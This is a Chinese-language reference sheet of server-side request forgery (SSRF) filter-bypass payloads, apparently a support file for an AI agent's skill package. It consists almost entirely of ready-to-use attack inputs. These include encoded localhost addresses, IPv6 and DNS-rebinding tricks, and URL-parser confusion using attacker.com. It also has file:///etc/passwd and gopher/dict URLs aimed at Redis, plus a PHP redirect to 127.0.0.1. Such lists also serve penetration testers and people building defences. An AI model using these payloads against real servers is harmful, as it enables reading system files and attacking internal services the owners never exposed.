# SSRF 绕过 Payload 参考

本文件包含 SSRF 过滤绕过的完整 payload 列表，供主技能文件引用。

## IP 地址变形

```
# 十进制
http://2130706433/          # 127.0.0.1
http://3232235521/          # 192.168.0.1

# 十六进制
http://0x7f000001/          # 127.0.0.1
http://0x7f.0x0.0x0.0x1/

# 八进制
http://0177.0.0.01/         # 127.0.0.1
http://017700000001/

# 缩写与特殊形式
http://127.1/
http://127.0.1/
http://0/
http://0.0.0.0/
```

## IPv6 绕过

```
http://[::1]/
http://[0:0:0:0:0:0:0:1]/
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/
```

## DNS 绕过

```
# 解析到 127.0.0.1 的公共域名
http://127.0.0.1.nip.io/
http://127.0.0.1.xip.io/
http://localtest.me/
http://spoofed.burpcollaborator.net/

# DNS Rebinding 攻击步骤：
# 1. 设置 DNS 记录 TTL=0
# 2. 第一次解析返回外部 IP（通过安全检查）
# 3. 第二次解析返回内部 IP（实际请求时命中内网）
```

## URL 解析差异

```
# @ 符号（部分解析器取 @ 后作为 host）
http://attacker.com@127.0.0.1/
http://127.0.0.1:80@attacker.com/

# # 符号
http://attacker.com#@127.0.0.1/
http://127.0.0.1#attacker.com/

# ? 符号
http://attacker.com?@127.0.0.1/

# 反斜杠
http://attacker.com\@127.0.0.1/
```

## 协议大小写与编码绕过

```
# 大小写变体
FILE:///etc/passwd
Gopher://127.0.0.1:6379/
DICT://127.0.0.1:6379/

# URL 编码
file%3a%2f%2f%2fetc%2fpasswd
gopher%3a%2f%2f127.0.0.1%3a6379%2f
```

## 重定向绕过

```bash
# 在自己的服务器设置 302 重定向
# redirect.php 内容：
# <?php header("Location: http://127.0.0.1/"); ?>

http://attacker.com/redirect.php
```

## 短链接绕过

```
# 创建指向 http://127.0.0.1 的短链接
http://bit.ly/xxxxx
http://tinyurl.com/xxxxx
```

## 内网地址范围

```
# 私有地址段
http://192.168.0.0/16
http://10.0.0.0/8
http://172.16.0.0/12

# 常用网关
http://192.168.1.1/
http://192.168.0.1/
http://10.0.0.1/
http://172.16.0.1/
```
